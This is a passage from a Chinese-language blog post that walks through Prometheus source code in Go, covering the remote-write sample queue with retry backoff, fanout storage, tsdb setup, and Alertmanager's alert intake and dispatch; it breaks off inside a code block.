class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *shards)</span> <span class="title">runShard</span><span class="params">(i <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> s.wg.Done()</span><br><span class="line">queue := s.queues[i]</span><br><span class="line"></span><br><span class="line"><span class="comment">// Send batches of at most MaxSamplesPerSend samples to the remote storage.</span></span><br><span class="line"><span class="comment">// If we have fewer samples than that, flush them out after a deadline</span></span><br><span class="line"><span class="comment">// anyways.</span></span><br><span class="line">pendingSamples := model.Samples&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> sample, ok := &lt;-queue:</span><br><span class="line"><span class="keyword">if</span> !ok &#123;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(pendingSamples) &gt; <span class="number">0</span> &#123;</span><br><span class="line">level.Debug(s.qm.logger).Log(<span class="string">"msg"</span>, <span class="string">"Flushing samples to remote storage..."</span>, <span class="string">"count"</span>, <span class="built_in">len</span>(pendingSamples))</span><br><span class="line">s.sendSamples(pendingSamples)</span><br><span class="line">level.Debug(s.qm.logger).Log(<span class="string">"msg"</span>, <span class="string">"Done flushing."</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">queueLength.WithLabelValues(s.qm.queueName).Dec()</span><br><span class="line">pendingSamples = <span class="built_in">append</span>(pendingSamples, sample)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> <span class="built_in">len</span>(pendingSamples) &gt;= s.qm.cfg.MaxSamplesPerSend &#123;</span><br><span class="line">s.sendSamples(pendingSamples[:s.qm.cfg.MaxSamplesPerSend])</span><br><span class="line">pendingSamples = pendingSamples[s.qm.cfg.MaxSamplesPerSend:]</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">case</span> &lt;-time.After(s.qm.cfg.BatchSendDeadline):</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(pendingSamples) &gt; <span class="number">0</span> &#123;</span><br><span class="line">s.sendSamples(pendingSamples)</span><br><span class="line">pendingSamples = pendingSamples[:<span class="number">0</span>]</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中调用了方法sendSamples去发送样本：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *shards)</span> <span class="title">sendSamples</span><span class="params">(samples model.Samples)</span></span> &#123;</span><br><span class="line">begin := time.Now()</span><br><span class="line">s.sendSamplesWithBackoff(samples)</span><br><span class="line"></span><br><span class="line"><span class="comment">// These counters are used to caclulate the dynamic sharding, and as such</span></span><br><span class="line"><span class="comment">// should be maintained irrespective of success or failure.</span></span><br><span class="line">s.qm.samplesOut.incr(<span class="keyword">int64</span>(<span class="built_in">len</span>(samples)))</span><br><span class="line">s.qm.samplesOutDuration.incr(<span class="keyword">int64</span>(time.Since(begin)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中方法使用了samplesOut和samplesOutDuration来计算分片的动态变化。保证成功发送和失败的数目。</p><p>启动调用函数sendSamplesWithBackOff函数来保证远程发送的时候失败的情况：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *shards)</span> <span class="title">sendSamplesWithBackoff</span><span class="params">(samples model.Samples)</span></span> &#123;</span><br><span class="line">backoff := s.qm.cfg.MinBackoff</span><br><span class="line"><span class="keyword">for</span> retries := s.qm.cfg.MaxRetries; retries &gt; <span class="number">0</span>; retries-- &#123;</span><br><span class="line">begin := time.Now()</span><br><span class="line">req := ToWriteRequest(samples)</span><br><span class="line">err := s.qm.client.Store(req)</span><br><span class="line"></span><br><span class="line">sentBatchDuration.WithLabelValues(s.qm.queueName).Observe(time.Since(begin).Seconds())</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">succeededSamplesTotal.WithLabelValues(s.qm.queueName).Add(<span class="keyword">float64</span>(<span class="built_in">len</span>(samples)))</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">level.Warn(s.qm.logger).Log(<span class="string">"msg"</span>, <span class="string">"Error sending samples to remote storage"</span>, <span class="string">"count"</span>, <span class="built_in">len</span>(samples), <span class="string">"err"</span>, err)</span><br><span class="line"><span class="keyword">if</span> _, ok := err.(recoverableError); !ok &#123;</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">time.Sleep(backoff)</span><br><span class="line">backoff = backoff * <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> backoff &gt; s.qm.cfg.MaxBackoff &#123;</span><br><span class="line">backoff = s.qm.cfg.MaxBackoff</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">failedSamplesTotal.WithLabelValues(s.qm.queueName).Add(<span class="keyword">float64</span>(<span class="built_in">len</span>(samples)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果发送失败会重试几次，如果还是失败，会将发送失败的样本计入失败的计算器。</p><p>如果成功，会调用Client中的Store方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(c *Client)</span> <span class="title">Store</span><span class="params">(req *prompb.WriteRequest)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">data, err := proto.Marshal(req)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">compressed := snappy.Encode(<span class="literal">nil</span>, data)</span><br><span class="line">httpReq, err := http.NewRequest(<span class="string">"POST"</span>, c.url.String(), bytes.NewReader(compressed))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Errors from NewRequest are from unparseable URLs, so are not</span></span><br><span class="line"><span class="comment">// recoverable.</span></span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">httpReq.Header.Add(<span class="string">"Content-Encoding"</span>, <span class="string">"snappy"</span>)</span><br><span class="line">httpReq.Header.Set(<span class="string">"Content-Type"</span>, <span class="string">"application/x-protobuf"</span>)</span><br><span class="line">httpReq.Header.Set(<span class="string">"X-Prometheus-Remote-Write-Version"</span>, <span class="string">"0.1.0"</span>)</span><br><span class="line"></span><br><span class="line">ctx, cancel := context.WithTimeout(context.Background(), c.timeout)</span><br><span class="line"><span class="keyword">defer</span> cancel()</span><br><span class="line"></span><br><span class="line">httpResp, err := ctxhttp.Do(ctx, c.client, httpReq)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="comment">// Errors from client.Do are from (for example) network errors, so are</span></span><br><span class="line"><span class="comment">// recoverable.</span></span><br><span class="line"><span class="keyword">return</span> recoverableError&#123;err&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> httpResp.Body.Close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> httpResp.StatusCode/<span class="number">100</span> != <span class="number">2</span> &#123;</span><br><span class="line">scanner := bufio.NewScanner(io.LimitReader(httpResp.Body, maxErrMsgLen))</span><br><span class="line">line := <span class="string">""</span></span><br><span class="line"><span class="keyword">if</span> scanner.Scan() &#123;</span><br><span class="line">line = scanner.Text()</span><br><span class="line">&#125;</span><br><span class="line">err = fmt.Errorf(<span class="string">"server returned HTTP status %s: %s"</span>, httpResp.Status, line)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> httpResp.StatusCode/<span class="number">100</span> == <span class="number">5</span> &#123;</span><br><span class="line"><span class="keyword">return</span> recoverableError&#123;err&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过post方式，发送数据。</p><p>本地存储主要使用的tsdb库中，后面的版本对tsdb有较为大的变化。</p><p>fanout为本地和远程的读写代理器，入口在fanout中，fanout的数据结构</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> fanout <span class="keyword">struct</span> &#123;</span><br><span class="line">logger log.Logger</span><br><span class="line"></span><br><span class="line">primary     Storage</span><br><span class="line">secondaries []Storage</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>初始化数据结构：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// NewFanout returns a new fan-out Storage, which proxies reads and writes</span></span><br><span class="line"><span class="comment">// through to multiple underlying storages.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewFanout</span><span class="params">(logger log.Logger, primary Storage, secondaries ...Storage)</span> <span class="title">Storage</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;fanout&#123;</span><br><span class="line">logger:      logger,</span><br><span class="line">primary:     primary,</span><br><span class="line">secondaries: secondaries,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>添加数据使用appender方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(f *fanout)</span> <span class="title">Appender</span><span class="params">()</span> <span class="params">(Appender, error)</span></span> &#123;</span><br><span class="line">primary, err := f.primary.Appender()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">secondaries := <span class="built_in">make</span>([]Appender, <span class="number">0</span>, <span class="built_in">len</span>(f.secondaries))</span><br><span class="line"><span class="keyword">for</span> _, storage := <span class="keyword">range</span> f.secondaries &#123;</span><br><span class="line">appender, err := storage.Appender()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line">secondaries = <span class="built_in">append</span>(secondaries, appender)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> &amp;fanoutAppender&#123;</span><br><span class="line">logger:      f.logger,</span><br><span class="line">primary:     primary,</span><br><span class="line">secondaries: secondaries,</span><br><span class="line">&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地存储使用tsdb来存储：</p><p>prometheus中提供了接口，调用tsdb数据库来进行存储。tsdb后续单独来说明。</p><p>打开一个db库函数：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Open</span><span class="params">(path <span class="keyword">string</span>, l log.Logger, r prometheus.Registerer, opts *Options)</span> <span class="params">(*tsdb.DB, error)</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> opts.MinBlockDuration &gt; opts.MaxBlockDuration &#123;</span><br><span class="line">opts.MaxBlockDuration = opts.MinBlockDuration</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Start with smallest block duration and create exponential buckets until the exceed the</span></span><br><span class="line"><span class="comment">// configured maximum block duration.</span></span><br><span class="line">rngs := tsdb.ExponentialBlockRanges(<span class="keyword">int64</span>(time.Duration(opts.MinBlockDuration).Seconds()*<span class="number">1000</span>), <span class="number">10</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i, v := <span class="keyword">range</span> rngs &#123;</span><br><span class="line"><span class="keyword">if</span> v &gt; <span class="keyword">int64</span>(time.Duration(opts.MaxBlockDuration).Seconds()*<span class="number">1000</span>) &#123;</span><br><span class="line">rngs = rngs[:i]</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">db, err := tsdb.Open(path, l, r, &amp;tsdb.Options&#123;</span><br><span class="line">WALFlushInterval:  <span class="number">10</span> * time.Second,</span><br><span class="line">RetentionDuration: <span class="keyword">uint64</span>(time.Duration(opts.Retention).Seconds() * <span class="number">1000</span>),</span><br><span class="line">BlockRanges:       rngs,</span><br><span class="line">NoLockfile:        opts.NoLockfile,</span><br><span class="line">&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> db, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="AlertManager"><a href="#AlertManager" class="headerlink" title="AlertManager"></a>AlertManager</h2><p>接收告警信息请求的地址为：<a href="http://localhost:9093/api/v1/alerts，api接收告警信息后会进入到api.addAlerts中。" target="_blank" rel="noopener">http://localhost:9093/api/v1/alerts，api接收告警信息后会进入到api.addAlerts中。</a></p><p>AlertManager服务启动时候，api.addAlerts方法会通过api.Register方法再路由中完成路由请求地址的注册。</p><p>在api.addAlerts方法中，会将从参数r中接受到的告警信息解析为types.Alert数组，最后将其插入本地缓存中。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(api *API)</span> <span class="title">addAlerts</span><span class="params">(w http.ResponseWriter, r *http.Request)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> alerts []*types.Alert</span><br><span class="line"><span class="keyword">if</span> err := receive(r, &amp;alerts); err != <span class="literal">nil</span> &#123;</span><br><span class="line">respondError(w, apiError&#123;</span><br><span class="line">typ: errorBadData,</span><br><span class="line">err: err,</span><br><span class="line">&#125;, <span class="literal">nil</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">api.insertAlerts(w, r, alerts...)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">receive</span><span class="params">(r *http.Request, v <span class="keyword">interface</span>&#123;&#125;)</span> <span class="title">error</span></span> &#123;</span><br><span class="line">dec := json.NewDecoder(r.Body)</span><br><span class="line"><span class="keyword">defer</span> r.Body.Close()</span><br><span class="line"></span><br><span class="line">err := dec.Decode(v)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Debugf(<span class="string">"Decoding request failed: %v"</span>, err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>告警调度：</p><p>告警信息被插入AlertManager本地缓存后，会通过告警调度服务从本地缓存中获取告警信息，并将告警信息发送出去。</p><p>本地缓存基于内存实现，</p><p>告警调度服务的初始化代码在main中，reload方法完成，</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">reload := <span class="function"><span class="keyword">func</span><span class="params">()</span> <span class="params">(err error)</span></span> &#123;</span><br><span class="line">log.With(<span class="string">"file"</span>, *configFile).Infof(<span class="string">"Loading configuration file"</span>)</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.With(<span class="string">"file"</span>, *configFile).Errorf(<span class="string">"Loading configuration file failed: %s"</span>, err)</span><br><span class="line">configSuccess.Set(<span class="number">0</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">configSuccess.Set(<span class="number">1</span>)</span><br><span class="line">configSuccessTime.Set(<span class="keyword">float64</span>(time.Now().Unix()))</span><br><span class="line">configHash.Set(hash)</span><br><span class="line">&#125;</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line">conf, plainCfg, err := config.LoadFile(*configFile)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">hash = md5HashAsMetricValue(plainCfg)</span><br><span class="line"></span><br><span class="line">err = apiv.Update(conf, time.Duration(conf.Global.ResolveTimeout))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">tmpl, err = template.FromGlobs(conf.Templates...)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br><span class="line">tmpl.ExternalURL = amURL</span><br><span class="line"></span><br><span class="line">inhibitor.Stop()</span><br><span class="line">disp.Stop()</span><br><span class="line"></span><br><span class="line">inhibitor = inhibit.NewInhibitor(alerts, conf.InhibitRules, marker)</span><br><span class="line">pipeline = notify.BuildPipeline(</span><br><span class="line">conf.Receivers,</span><br><span class="line">tmpl,</span><br><span class="line">waitFunc,</span><br><span class="line">inhibitor,</span><br><span class="line">silences,</span><br><span class="line">notificationLog,</span><br><span class="line">marker,</span><br><span class="line">)</span><br><span class="line">disp = dispatch.NewDispatcher(alerts, dispatch.NewRoute(conf.Route, <span class="literal">nil</span>), pipeline, marker, timeoutFunc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> disp.Run()</span><br><span class="line"><span class="keyword">go</span> inhibitor.Run()</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Run方法具体实现如下：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Run starts dispatching alerts incoming via the updates channel.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(d *Dispatcher)</span> <span class="title">Run</span><span class="params">()</span></span> &#123;</span><br><span class="line">d.done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line">d.mtx.Lock()</span><br><span class="line">d.aggrGroups = <span class="keyword">map</span>[*Route]<span class="keyword">map</span>[model.Fingerprint]*aggrGroup&#123;&#125;</span><br><span class="line">d.mtx.Unlock()</span><br><span class="line"></span><br><span class="line">d.ctx, d.cancel = context.WithCancel(context.Background())</span><br><span class="line"></span><br><span class="line">d.run(d.alerts.Subscribe())</span><br><span class="line"><span class="built_in">close</span>(d.done)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Subscribe方法：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">// Subscribe returns an iterator over active alerts that have not been</span></span><br><span class="line"><span class="comment">// resolved and successfully notified about.</span></span><br><span class="line"><span class="comment">// They are not guaranteed to be in chronological order.</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(a *Alerts)</span> <span class="title">Subscribe</span><span class="params">()</span> <span class="title">provider</span>.<span class="title">AlertIterator</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">ch   = <span class="built_in">make</span>(<span class="keyword">chan</span> *types.Alert, <span class="number">200</span>)</span><br><span class="line">done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line">)</span><br><span class="line">alerts, err := a.getPending()</span><br><span class="line"></span><br><span class="line">a.mtx.Lock()</span><br><span class="line">i := a.next</span><br><span class="line">a.next++</span><br><span class="line">a.listeners[i] = ch</span><br><span class="line">a.mtx.Unlock()</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">defer</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">a.mtx.Lock()</span><br><span class="line"><span class="built_in">delete</span>(a.listeners, i)</span><br><span class="line"><span class="built_in">close</span>(ch)</span><br><span class="line">a.mtx.Unlock()</span><br><span class="line">&#125;()</span><br><span class="line"><span class="comment">//遍历告警列表</span></span><br><span class="line"><span class="keyword">for</span> _, a := <span class="keyword">range</span> alerts &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line">                <span class="comment">//将告警信息放入通道ch中</span></span><br><span class="line"><span class="keyword">case</span> ch &lt;- a:</span><br><span class="line"><span class="keyword">case</span> &lt;-done:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&lt;-done</span><br><span class="line">&#125;()</span><br><span class="line"><span class="comment">//构建告警信息迭代器</span></span><br><span class="line"><span class="keyword">return</span> provider.NewAlertIterator(ch, done, err)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// NewAlertIterator returns a new AlertIterator based on the generic alertIterator type</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewAlertIterator</span><span class="params">(ch &lt;-<span class="keyword">chan</span> *types.Alert, done <span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, err error)</span> <span class="title">AlertIterator</span></span> &#123;</span><br><span class="line"><span class="keyword">return</span> &amp;alertIterator&#123;</span><br><span class="line">ch:   ch,</span><br><span class="line">done: done,</span><br><span class="line">err:  err,</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>run方法中，对告警信息的处理分为4步：获取告警信息，告警路由匹配，告警信息处理，清除告警信息为空的aggrGroup。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span 